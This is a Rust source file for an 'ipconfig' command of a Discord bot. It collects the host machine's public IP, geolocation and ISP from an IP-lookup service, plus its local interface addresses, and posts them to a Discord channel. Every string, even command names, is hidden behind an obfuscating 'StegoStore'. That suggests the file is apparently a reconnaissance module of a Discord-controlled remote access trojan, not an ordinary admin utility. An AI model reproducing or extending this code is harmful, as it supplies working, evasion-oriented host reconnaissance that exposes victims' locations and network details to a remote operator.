use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::Result;
use async_trait::async_trait;
use get_if_addrs::IfAddr; // import enum for matching
use serde_json::Value;
use std::collections::HashMap;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::embed::EmbedField;
use twilight_model::channel::message::Message;
use twilight_util::builder::embed::{EmbedBuilder, EmbedFooterBuilder};
pub struct IpconfigCommand;

impl IpconfigCommand {
    fn n(key: &str) -> String { StegoStore::get(StringCategory::Network, key) }
    fn c(key: &str) -> String { StegoStore::get(StringCategory::CmdMeta, key) }
}

#[async_trait]
impl BotCommand for IpconfigCommand {
    fn name(&self) -> &str {
        Box::leak(Self::c("IPCONFIG_NAME").into_boxed_str())
    }
    fn description(&self) -> &str { 
        Box::leak(StegoStore::get(StringCategory::Desc, "NETINFO").into_boxed_str())
    }
    fn category(&self) -> &str {
        Box::leak(Self::c("CAT_NET").into_boxed_str())
    }
    fn usage(&self) -> &str {
        Box::leak(Self::c("IPCONFIG_USAGE").into_boxed_str())
    }
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![Box::leak(Self::c("IPCONFIG_USAGE").into_boxed_str()) as &'static str].into_boxed_slice())
    }
    fn aliases(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(Self::c("IPCONFIG_ALIAS1").into_boxed_str()) as &'static str,
            Box::leak(Self::c("IPCONFIG_ALIAS2").into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, _args: Arguments) -> Result<()> {
        let thinking_msg_json = http
            .create_message(msg.channel_id.into(), &format!("`{}`", Self::n("FETCH_IP"))).await?;
        let thinking_msg: Message = serde_json::from_str(&thinking_msg_json)?;

        let public_ip_info = get_public_ip_info().await;
        let interfaces = get_if_addrs::get_if_addrs().unwrap_or_default();

        let mut embed = EmbedBuilder::new()
            .title(Self::n("NET_CONF"))
            .color(0x00AEEF)
            .footer(EmbedFooterBuilder::new(StegoStore::get(StringCategory::Core, "BOT_NAME") + " Network Utility"));

        // add public ip info first
        let public_ip_field = match public_ip_info {
            Ok(info) => info,
            Err(e) => format!("**Error:** {}", e),
        };
        embed = embed.field(EmbedField {
            name: Self::n("PUB_IP"),
            value: public_ip_field,
            inline: false,
        });

        // group addresses by interface name manually
        let mut grouped_ifaces: HashMap<String, (Vec<String>, Option<String>)> = HashMap::new();
        for iface in interfaces {
            if iface.is_loopback() {
                continue;
            }

            let entry = grouped_ifaces.entry(iface.name).or_default();

            match iface.addr {
                IfAddr::V4(addr) => {
                    entry.0.push(format!("**IPv4:** `{}`", addr.ip));
                }
                IfAddr::V6(addr) => {
                    if !addr.ip.is_loopback() && !addr.ip.to_string().starts_with("fe80") {
                        entry.0.push(format!("**IPv6:** `{}`", addr.ip));
                    }
                }
            }
        }

        // Create embed fields from the grouped data
        for (name, (ips, _mac)) in grouped_ifaces {
            if !ips.is_empty() {
                embed = embed.field(EmbedField {
                    name: format!("{}: {}", StegoStore::get(StringCategory::Core, "INTERFACE"), name),
                    value: ips.join("\n"),
                    inline: true,
                });
            }
        }

        // Instead of deleting and creating, we update the thinking message or just send the new one.
        // But HttpClient's update_message only supports content, not embeds yet.
        // Let's fix create_message_with_embeds by NOT deleting the thinking message if it fails.
        let embed_build = embed.build();
        match http.create_message_with_embeds(msg.channel_id.into(), &[embed_build]).await {
            Ok(_) => {
                let _ = http.delete_message(thinking_msg.channel_id, thinking_msg.id).await;
            }
            Err(e) => {
                let _ = http.update_message(thinking_msg.channel_id, thinking_msg.id, Some(format!("**Error building network report:** {}", e))).await;
            }
        }

        Ok(())
    }
}

// gets rich public ip info from ip-api.com
async fn get_public_ip_info() -> Result<String> {
    let url = StegoStore::get(StringCategory::Url, "IP_API");
    let resp = reqwest::get(url).await?.text().await?;
    let v: Value = serde_json::from_str(&resp)?;

    if v["status"] != "success" {
        return Ok(StegoStore::get(StringCategory::Network, "ERR_PUBLIC_IP"));
    }

    let ip = v["query"].as_str().unwrap_or("N/A");
    let country = v["country"].as_str().unwrap_or("N/A");
    let city = v["city"].as_str().unwrap_or("N/A");
    let isp = v["isp"].as_str().unwrap_or("N/A");

    Ok(StegoStore::get(StringCategory::Network, "NETINFO_FMT")
        .replace("{ip_label}", &StegoStore::get(StringCategory::Network, "IP_LABEL"))
        .replace("{ip}", ip)
        .replace("{loc_label}", &StegoStore::get(StringCategory::Network, "LOCATION_LABEL"))
        .replace("{city}", city)
        .replace("{country}", country)
        .replace("{isp_label}", &StegoStore::get(StringCategory::Network, "ISP_LABEL"))
        .replace("{isp}", isp))
}





